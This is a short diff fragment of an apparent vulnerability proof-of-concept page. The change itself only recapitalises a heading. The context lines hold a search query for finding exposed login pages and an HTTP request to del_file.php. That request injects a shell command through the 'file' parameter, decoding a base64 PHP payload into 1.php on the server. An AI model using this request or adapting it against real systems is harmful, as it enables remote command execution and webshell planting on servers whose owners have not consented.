@@ -8,7 +8,7 @@
 body="img/login_bg3.png" && body="系统登录"
 ```
 
-## poc
+## POC
 
 ```
 GET /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgZWNobyBtZDUoJzEyMzQ1NicpO3VubGluayhfX0ZJTEVfXyk7Pz4%3D%20%7C%20base64%20-d%20%3E%201.php HTTP/1.1
